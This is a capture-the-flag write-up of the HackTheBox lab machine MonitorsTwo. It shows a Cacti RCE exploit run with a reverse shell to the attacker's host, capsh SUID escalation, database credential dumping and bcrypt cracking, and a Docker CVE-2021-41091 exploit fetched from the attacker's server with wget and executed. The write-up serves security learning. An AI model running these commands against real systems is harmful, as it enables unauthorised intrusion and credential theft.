--
title: MonitorsTwo
published: true
layout: post
---

<br />

---------------
MonitorsTwo is an Easy Difficulty Linux machine showcasing a variety of vulnerabilities and misconfigurations. Initial enumeration exposes a web application prone to pre-authentication Remote Code Execution (RCE) through a malicious X-Forwarded-For header. Exploiting this vulnerability grants a shell within a Docker container. A misconfigured capsh binary with the SUID bit set allows for root access inside the container. Uncovering MySQL credentials enables the dumping of a hash, which, once cracked, provides SSH access to the machine. Further enumeration reveals a vulnerable Docker version ( CVE- 2021-41091 ) that permits a low-privileged user to access mounted container filesystems. Leveraging root access within the container, a bash binary with the SUID bit set is copied, resulting in privilege escalation on the host.
<br />

<iframe style="aspect-ratio: 16 / 9; width: 65%; display: block; margin: auto;" src="https://www.youtube.com/embed/iPCVUhVGfyY?si=5loK3tb6zWLzhH8v" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<br />

---------------------------------------------------
<br />

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />

Let's start by scanning for **open ports**:

```bash
sudo nmap -sT 10.10.11.211 -p- -T4 --min-rate 5000 -oN all_tcp_ports.txt --open -n -Pn -vv
sudo nmap -sU 10.10.11.211 -p- -T4 --min-rate 5000 -oN all_udp_ports.txt --open -n -Pn -vv
```
<br />

There are **2 open ports**:
+ **22/tcp**
+ **80/tcp**

<br />

Let's check which **services** are running in these ports:

```bash
sudo nmap -sT 10.10.11.211 -p 22,80 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
```
<br />

These services are:
+ **22/tcp OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)**
+ **80/tcp nginx 1.18.0 (Ubuntu)**

<br />

------
<br />
### Foothold

The first thing that I notice when checking the website is a **version number** for the **cacti software**:<br />
![](/assets/MonitorsTwo/1.png)
<br />
<br />

A quick search reveals a vulnerability and some exploits:<br />
![](/assets/MonitorsTwo/2.png)
<br />
<br />

I found a [GitHub exploit](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22) that works pretty well:<br />
![](/assets/MonitorsTwo/3.png)
<br />
<br />

Let's use it:

```bash
python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.16.12 --LPORT=4444
```

![](/assets/MonitorsTwo/4.png)
<br />
<br />

Based on the hostname, it seems that we are in a container:<br />
![](/assets/MonitorsTwo/5.png)
<br />
<br />

Enumerating the machine, I found an **uncommon executable** with **SUID privileges**:<br />
![](/assets/MonitorsTwo/6.png)
<br />
<br />

I checked it on **GTFOBins** and exploited it to gain **root privileges**:<br />

```bash
/sbin/capsh --gid=0 --uid=0 --
```

![](/assets/MonitorsTwo/7.png)
<br />
<br />

Great!!! Let's sanitize the shell and look for a way out of this container:

```bash
script /dev/null -c bash
```
<br />

Enumerating a little bit more we can find an **interesting script**:<br />
![](/assets/MonitorsTwo/8.png)
<br />
<br />

So I copied the command, connected to the database and enumerated it:

```bash
mysql --host=db --user=root --password=root cacti
show tables;
describe user_auth;
select username,password from user_auth;
```

![](/assets/MonitorsTwo/9.png)
<br />
<br />

It seems that we got some credentials, and there was an SSH service, so let's copy this hashes and attempt to crack them:

```bash
echo -n '$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C'> marcus_hash
echo -n '$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC' > admin_hash
john marcus_hash --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

![](/assets/MonitorsTwo/10.png)
<br />
<br />

Nice!!! But sadly the admin hash didn't return a result, so let's connect to the machine using SSH:

```bash
ssh marcus@10.10.11.211
```

![](/assets/MonitorsTwo/11.png)
<br />
<br />

------
<br />
### Privilege Escalation

Enumerating the machine, I found an **interesting email** from marcus's CISO:<br />
![](/assets/MonitorsTwo/12.png)
<br />
<br />

Thanks CISO! The CISO reveals us three vulnerabilities, the first one if a **kernel vulnerability** that we may use to escalate privileges, the second one has already been fixed, as Cacti version is 1.2.22, and the third one is a **Docker vulnerability** that we can use to escalate privileges. Let's go first after the Docker vulnerability, as the kernel one may destabilize the machine. I found an [interesting exploit](https://github.com/UncleJ4ck/CVE-2021-41091) so let's put it to work:

```bash
Attacker> git clone https://github.com/UncleJ4ck/CVE-2021-41091
Attacker> cd CVE-2021-41091
Attacker> sudo python3 -m http.server 80
Target> wget http://10.10.16.12/exp.sh
Target> chmod +x ./exp.sh
Target> ./exp.sh
```

![](/assets/MonitorsTwo/13.png)
<br />
<br />

This exploit ask us to set the **SUID bit on the /bin/bash executable on a container**, luckily for us we have already compromised one, so let's set that bit:

```bash
chmod u+s /bin/bash
ls -l /bin/bash
```

![](/assets/MonitorsTwo/14.png)
<br />
<br />

Let's continue with the exploit execution:<br />
![](/assets/MonitorsTwo/15.png)
<br />
<br />

It seems that it worked, let's go to that path and run that command:

```bash
cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
./bin/bash -p
```

![](/assets/MonitorsTwo/16.png)
<br />
<br />
